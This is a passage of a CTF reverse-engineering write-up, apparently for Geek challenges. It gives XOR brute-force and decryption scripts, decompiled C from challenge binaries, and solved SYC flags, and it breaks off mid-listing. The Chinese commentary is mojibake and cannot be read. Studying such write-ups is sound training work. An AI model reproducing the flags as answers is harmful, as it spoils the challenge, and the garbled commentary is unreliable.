</span></span><span class="line"><span class="cl">    <span class="n">decrypt_result</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">target_data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypt_byte</span> <span class="o">=</span> <span class="n">target_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">base_candidate</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypt_result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">decrypt_byte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypt_str</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decrypt_result</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">decrypt_str</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;SYC{&#34;</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">decrypt_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">valid_candidates</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;å›ºå®šåç§»å¼‚æˆ–ï¼ˆbase=</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_candidate</span><span class="p">)</span><span class="si">}</span><span class="s2">ï¼‰: </span><span class="si">{</span><span class="n">decrypt_str</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 4. ç±»å‹4ï¼šå•å­—èŠ‚å¼‚æˆ–+ç§»ä½ï¼ˆå·¦ç§»1ä½/å³ç§»1ä½ï¼ŒCTFé«˜é¢‘ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crack_xor_shift</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å°è¯•ä¸¤ç§å¸¸è§ç§»ä½ï¼šå¼‚æˆ–åå·¦ç§»1ä½ã€å¼‚æˆ–åå³ç§»1ä½ï¼ˆåŸºäºå‰ç¼€åæ¨keyï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">shift_types</span> <span class="o">=</span> <span class="p">[(</span><span class="s2">&#34;å·¦ç§»1ä½&#34;</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="s2">&#34;å³ç§»1ä½&#34;</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">shift_name</span><span class="p">,</span> <span class="n">shift_func</span> <span class="ow">in</span> <span class="n">shift_types</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ¨å¯¼keyï¼šp0 = shift_func(t0 ^ key) â†’ key = t0 ^ unshift(p0)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å³ç§»1ä½çš„é€†æ“ä½œï¼šp0 &lt;&lt; 1 æˆ– (p0 &lt;&lt; 1) | 1ï¼ˆä½†åŸºäºflagå­—ç¬¦ï¼Œä¼˜å…ˆp0&lt;&lt;1ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">shift_name</span> <span class="o">==</span> <span class="s2">&#34;å³ç§»1ä½&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">unshift_p0</span> <span class="o">=</span> <span class="n">flag_prefix</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>  <span class="c1"># å·¦ç§»1ä½çš„é€†æ“ä½œï¼šp0 &gt;&gt; 1</span>
</span></span><span class="line"><span class="cl">            <span class="n">unshift_p0</span> <span class="o">=</span> <span class="n">flag_prefix</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">key_candidate</span> <span class="o">=</span> <span class="n">target_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">unshift_p0</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># éªŒè¯å‰4å­—èŠ‚æ˜¯å¦ç¬¦åˆ</span>
</span></span><span class="line"><span class="cl">        <span class="n">valid_key</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypt_temp</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">t</span> <span class="o">=</span> <span class="n">target_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">xor_val</span> <span class="o">=</span> <span class="n">t</span> <span class="o">^</span> <span class="n">key_candidate</span>
</span></span><span class="line"><span class="cl">            <span class="n">shifted_val</span> <span class="o">=</span> <span class="n">shift_func</span><span class="p">(</span><span class="n">xor_val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">shifted_val</span> <span class="o">!=</span> <span class="n">flag_prefix</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                <span class="n">valid_key</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="n">decrypt_temp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor_val</span><span class="p">)</span>  <span class="c1"># åŸå§‹å¼‚æˆ–åçš„å€¼ï¼ˆç§»ä½å‰ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">valid_key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è§£å¯†å®Œæ•´æ•°æ®ï¼ˆå–ç§»ä½å‰çš„åŸå§‹å€¼ï¼Œå³flagæ˜æ–‡ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypt_result</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">target_data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">xor_val</span> <span class="o">=</span> <span class="n">target_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key_candidate</span>
</span></span><span class="line"><span class="cl">            <span class="n">decrypt_result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor_val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypt_str</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decrypt_result</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">decrypt_str</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;SYC{&#34;</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">decrypt_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">valid_candidates</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;å•å­—èŠ‚å¼‚æˆ–+</span><span class="si">{</span><span class="n">shift_name</span><span class="si">}</span><span class="s2">ï¼ˆkey=</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">key_candidate</span><span class="p">)</span><span class="si">}</span><span class="s2">ï¼‰: </span><span class="si">{</span><span class="n">decrypt_str</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ‰§è¡Œæ‰€æœ‰ç ´è§£ç±»å‹</span>
</span></span><span class="line"><span class="cl"><span class="n">crack_2byte_xor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">crack_4byte_xor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">crack_offset_xor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">crack_xor_shift</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¾“å‡ºæ‰€æœ‰åˆç†å€™é€‰è§£</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æ‰¾åˆ°æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„æ½œåœ¨è§£ï¼ˆæŒ‰åŠ å¯†ç±»å‹åˆ†ç±»ï¼‰ï¼š&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">valid_candidates</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">valid_candidates</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">. </span><span class="si">{</span><span class="n">candidate</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">æœªæ‰¾åˆ°å…¶ä»–å¼‚æˆ–å˜ç§è§£ï¼Œå½“å‰ä»…å•å­—èŠ‚å¼‚æˆ–ï¼ˆkey=0x5Aï¼‰ç¬¦åˆå‰ç¼€æ¡ä»¶ï¼&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œç»“æœ</p>
<p>æ‰¾åˆ°æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„æ½œåœ¨è§£ï¼ˆæŒ‰åŠ å¯†ç±»å‹åˆ†ç±»ï¼‰ï¼š</p>
<ol>
<li>2å­—èŠ‚å¯†é’¥å¼‚æˆ–ï¼ˆkey=0x5a,0x5aï¼‰: SYC{W31c0m3_t0_r3@1_r3verse!}</li>
<li>4å­—èŠ‚å¯†é’¥å¼‚æˆ–ï¼ˆkey=[&lsquo;0x5a&rsquo;, &lsquo;0x5a&rsquo;, &lsquo;0x5a&rsquo;, &lsquo;0x5a&rsquo;]ï¼‰: SYC{W31c0m3_t0_r3@1_r3verse!</li>
</ol>
<p>æ³¨æ„å¤šè§£ï¼Œç¬¬ä¸€æ¬¡å•å­—èŠ‚å¼‚æˆ–å°±å‡ºäº†ä¸€ä¸ª</p>
<h3 id="12geekbinder">12.GeekBinder
</h3><p>è¿™é¢˜å¯ä»¥ä¸äº†è§£binderï¼Œç›´æ¥çœ‹.soæ–‡ä»¶</p>
<p>å¯ä»¥æ‰¾åˆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">attr_get_hidden_cipher</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="n">_QWORD</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">a1</span> <span class="o">||</span> <span class="o">!</span><span class="n">a2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x5BuLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">4294967294LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">v3</span> <span class="o">=</span> <span class="mh">0x7C725E7310263C34LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5D666F5505541F1ELL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4601535D19153A54LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4266037034165614LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x505E5974340B0002LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5B5D536D18543A54LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5A666F4B19251713LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6A5E705F19550B38LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x651594608251717LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x506D5560340B5438LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x440555705540209LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">44</span><span class="p">)</span> <span class="o">=</span> <span class="mi">521</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">90</span><span class="p">)</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">a1</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">a2</span> <span class="o">=</span> <span class="mi">91LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_1119</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">a2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">aGeek2025</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸€çœ¼å¼‚æˆ–ï¼Œæ³¨æ„å¯†æ–‡å¤åŸçš„æ—¶å€™åä¸¤å¥çš„å°å‘</p>
<p>è§£å¯†è„šæœ¬å¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">91</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x3C</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x5E</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x7C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x1E</span><span class="p">,</span><span class="mh">0x1F</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x6F</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x5D</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x3A</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0x5D</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x42</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x0B</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x5E</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x3A</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0x6D</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x5D</span><span class="p">,</span><span class="mh">0x5B</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x13</span><span class="p">,</span><span class="mh">0x17</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0x4B</span><span class="p">,</span><span class="mh">0x6F</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x5A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x0B</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0x5F</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x5E</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x17</span><span class="p">,</span><span class="mh">0x17</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x0B</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x6D</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x18</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="s">&#34;geek2025&#34;</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">91</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="mi">8</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»“æœSYC{An@Iyz1ng_Th3_proc3ss3s_B3Tween_File3_1s_contr@ry_To_n0rm@l_pr@ctic3_1n_Re_eng1neer1ng}</p>
<h3 id="13å›½äº§ã®å…‰">13.å›½äº§ã®å…‰
</h3><p>æŠŠ.hapæ–‡ä»¶æ”¹ä¸º.zipè§£å‹ä¹‹ååœ¨etsä¸­æ‰¾åˆ°.abcæ–‡ä»¶ï¼Œåç¼–è¯‘ä¸€ä¸‹æ‰¾åˆ°å¦‚ä¸‹ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
